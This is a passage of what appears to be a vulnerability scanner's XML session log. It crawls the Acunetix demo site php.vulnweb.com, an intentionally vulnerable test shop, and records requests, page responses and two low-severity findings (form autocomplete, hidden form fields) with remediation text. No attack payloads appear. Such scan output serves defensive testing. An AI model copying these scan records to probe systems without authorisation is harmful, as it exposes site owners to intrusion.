    Cras venenati</div><div class='story'><a href='listproducts.php?cat=2'><h3>Paintings</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div><div class='story'><a href='listproducts.php?cat=3'><h3>Stickers</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div><div class='story'><a href='listproducts.php?cat=4'><h3>Graffity</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="8681F4E7C8D52EA34B378320F672FB6F"><Method>GET</Method><Path>/</Path><File>categories</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="8681F4E7C8D52EA34B378320F672FB6F";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="60";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="08359d89";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="e7b10f03";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture categories</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">categories</h2>
	<div class='story'><a href='listproducts.php?cat=1'><h3>Posters</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div><div class='story'><a href='listproducts.php?cat=2'><h3>Paintings</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div><div class='story'><a href='listproducts.php?cat=3'><h3>Stickers</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div><div class='story'><a href='listproducts.php?cat=4'><h3>Graffity</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
    Cras venenati</div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:25 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6115</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="550874D3724AE35CB5416B86C5EEFA80"><URL>http://php.vulnweb.com:80/disclaimer.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="7470cb87-7c49-409d-a566-e3a05418b225"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="3286" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="550874D3724AE35CB5416B86C5EEFA80"><![CDATA[GET /disclaimer.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="550874D3724AE35CB5416B86C5EEFA80";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="61";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="03a140ff";
X-Request-Memo: ID="1ea2eeb3";sc="1";tid="36";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:25 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5524

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>disclaimer</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">Disclaimer</h2>
	  <div class="story">
		<h6>Please read carefully</h6>
		<p>This website is created to demonstrate the abilities of Acunetix new product <strong>WEB Vulnerability Scanner</strong>.</p>
		It is not intended to be a real online shop. Also this website was constructed with common web programming errors so it is buggy.
		<p>Please do not post any confidential information on this site. Do not give any creditcard number or real address, nor e-mail or
		website addresses.</p>
		<p>Information you post on this site are by no means private nor protected!</p>
		<p>All images on this site were generated with fre software <a href="http://www.eclectasy.com/Fractal-Explorer/index.html" target="_blank">
		<strong>Fractal Explorer</strong></a>.</p>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="550874D3724AE35CB5416B86C5EEFA80"><Method>GET</Method><Path>/</Path><File>disclaimer</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="550874D3724AE35CB5416B86C5EEFA80";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="61";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="03a140ff";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1ea2eeb3";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>disclaimer</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">Disclaimer</h2>
	  <div class="story">
		<h6>Please read carefully</h6>
		<p>This website is created to demonstrate the abilities of Acunetix new product <strong>WEB Vulnerability Scanner</strong>.</p>
		It is not intended to be a real online shop. Also this website was constructed with common web programming errors so it is buggy.
		<p>Please do not post any confidential information on this site. Do not give any creditcard number or real address, nor e-mail or
		website addresses.</p>
		<p>Information you post on this site are by no means private nor protected!</p>
		<p>All images on this site were generated with fre software <a href="http://www.eclectasy.com/Fractal-Explorer/index.html" target="_blank">
		<strong>Fractal Explorer</strong></a>.</p>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:25 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5524</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="4B3049C9BE5176469488667153D76A50"><URL>http://php.vulnweb.com:80/guestbook.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="1e43c749-dd63-46bf-8a8a-457251ddfe3a"><CheckTypeID>Info</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>4727</VulnerabilityID><Severity>0</Severity><Name>Hidden Form Value</Name><Classifications><Classification kind="CWE" identifier="CWE-472" href="http://cwe.mitre.org/data/definitions/472.html">CWE-472: External Control of Assumed-Immutable Web Parameter</Classification><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="Hidden Field" href="https://vulncat.fortify.com/">Hidden Field</Classification></Classifications><DetectionSelection><Location offset="606" length="4" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[While preventing display of information on the web page itself, the information submitted via hidden form fields is easily accessible, and could give an attacker valuable information that would prove helpful in escalating his attack methodology. 
Recommendations include not relying on hidden form fields as a security solution for any area of the web application that contains sensitive information or access to privileged functionality such as remote site administration functionality.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />The greatest danger from exploitation of a hidden form field design vulnerability is that the attacker will gain information that will help in orchestrating a far more dangerous attack.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br /><br />Any attacker could bypass a hidden form field security solution by viewing the source code of that particular page.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Do not rely on hidden form fields as a method of passing sensitive information or maintaining session state.  One workable bypass is to encrypt the hidden values in a form, and then decrypt them when that information is to be utilized by a database operation or a script. From a security standpoint, the best method of temporarily storing information required by different forms is to utilize a session cookie. <br /><br />
Whether hidden or not, if your site utilizes values submitted via a form to construct database queries, do not make the assumption that the data is non-malicious. Instead, utilize the following recommendations to sanitize user supplied input.
